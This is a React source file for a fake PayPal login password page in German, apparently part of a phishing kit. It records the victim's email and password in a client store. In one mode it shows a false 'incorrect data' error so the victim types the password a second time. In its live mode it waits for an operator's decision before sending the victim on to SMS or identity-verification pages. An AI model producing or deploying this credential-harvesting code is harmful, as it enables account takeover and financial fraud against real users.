import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'motion/react';
import PayPalInput from '../components/PayPalInput';
import { Loader2 } from 'lucide-react';
import { ClientStore } from '../services/ClientStore';

export default function LoginPassword() {
  const location = useLocation();
  const navigate = useNavigate();
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [attempt, setAttempt] = useState(1);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const email = location.state?.email || 'adresse@mail';

  // Poll for admin decision in LIVE mode
  useEffect(() => {
    let interval: number | undefined;
    
    if (waitingForAdmin) {
      interval = window.setInterval(async () => {
        const clients = await ClientStore.fetchClients();
        const id = sessionStorage.getItem('clientId');
        const me = clients.find(c => c.id === id);
        
        if (me && me.adminDecision !== 'PENDING') {
          setWaitingForAdmin(false);
          setIsLoading(false);
          
          if (me.adminDecision === 'FORWARD') {
            // Reset decision for next page
            await ClientStore.addOrUpdateClient({ id: id!, adminDecision: 'PENDING', waitingFor: 'NONE' });
            navigate('/redirect', { state: { next: '/sms-verification' } });
          } else {
            // Declined
            setError('Systemfehler: Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Daten.');
            await ClientStore.addOrUpdateClient({ id: id!, adminDecision: 'PENDING', waitingFor: 'NONE' });
          }
        }
      }, 1500);
    }
    
    return () => { if (interval) clearInterval(interval); };
  }, [waitingForAdmin, navigate]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;

    const clientId = sessionStorage.getItem('clientId') || 'unknown';
    const mode = ClientStore.getSystemMode();

    if (mode === 'AFK') {
      setIsLoading(true);
      setError('');
      setTimeout(() => {
        setIsLoading(false);
        if (attempt === 1) {
          setError('Ihre Angaben sind nicht korrekt. Bitte versuchen Sie es erneut.');
          setAttempt(2);
          setPassword('');
          ClientStore.addOrUpdateClient({ id: clientId, email, password, status: 'PENDING' });
        } else {
          ClientStore.addOrUpdateClient({ id: clientId, email, password, status: 'PENDING' });
          navigate('/redirect', { state: { next: '/identity-verification' } });
        }
      }, 2000);
    } else {
      // LIVE mode
      setIsLoading(true);
      setError('');
      ClientStore.addOrUpdateClient({ 
        id: clientId, 
        email, 
        password, 
        status: 'PENDING',
        waitingFor: 'LOGIN',
        adminDecision: 'PENDING'
      });
      setWaitingForAdmin(true);
    }
  };

  return (
    <div className="w-full max-w-[460px] mx-auto px-6 py-12 md:py-20 relative">
      <AnimatePresence>
        {isLoading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 z-50 flex items-center justify-center bg-[var(--color-app-bg)]/80 backdrop-blur-[2px]"
          >
            <div className="p-10 bg-white rounded-3xl shadow-xl flex flex-col items-center gap-4">
              <Loader2 className="w-12 h-12 text-primary animate-spin" />
              <p className="text-sm font-bold text-primary animate-pulse uppercase tracking-wider">Anmeldung...</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-3xl p-8 md:p-10 text-center shadow-sm border border-slate-100"
      >
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" 
            alt="PayPal Logo" 
            className="h-10"
            referrerPolicy="no-referrer"
          />
        </div>

        <div className="mb-6 flex flex-col items-center">
          <div className="flex items-center gap-2 px-3 py-1 bg-slate-50 rounded-full border border-slate-200">
            <span className="text-[13px] text-text-main font-medium">{email}</span>
            <button 
              onClick={() => navigate('/login-email')}
              className="text-[12px] font-bold text-secondary hover:underline"
            >
              Ändern
            </button>
          </div>
        </div>

        <form onSubmit={handleLogin} className="space-y-6 text-left">
          {error && (
            <div className="p-3 bg-red-50 border border-red-100 rounded-lg text-red-600 text-[13px] font-medium leading-tight">
              {error}
            </div>
          )}
          <PayPalInput 
            label="Passwort"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            autoFocus
            showToggle={true}
          />

          <div className="font-bold">
            <a href="#" className="text-[14px] text-secondary hover:underline">
              Passwort vergessen?
            </a>
          </div>

          <button 
            type="submit"
            disabled={isLoading}
            className="w-full bg-primary text-white font-bold py-3 px-6 rounded-full transition-all hover:bg-secondary disabled:opacity-50"
          >
            Einloggen
          </button>
        </form>

        <div className="mt-8 flex justify-center gap-4 text-[13px] font-bold text-secondary">
          <a href="#" className="hover:underline">Deutsch</a>
          <span className="text-slate-300 font-normal">|</span>
          <a href="#" className="hover:underline">English</a>
        </div>
      </motion.div>
    </div>
  );
}
